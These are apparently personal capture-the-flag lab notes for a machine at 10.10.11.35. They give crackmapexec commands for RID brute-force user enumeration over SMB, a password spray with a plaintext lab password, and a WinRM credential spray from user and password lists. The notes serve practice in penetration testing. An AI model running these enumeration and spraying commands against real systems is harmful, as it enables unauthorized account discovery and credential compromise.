## Crackmapexec
rid-brute
```
crackmapexec smb 10.10.11.35 -u guest -p '' --rid-brute | grep SidTypeUser
```
![[Pasted image 20240928221302.png]]

password spray
```
crackmapexec smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success 
```
![[Pasted image 20240928221515.png]]

```
crackmapexec winrm 10.10.11.35 -u users.txt -p Passwords.txt --continue-on-success
```
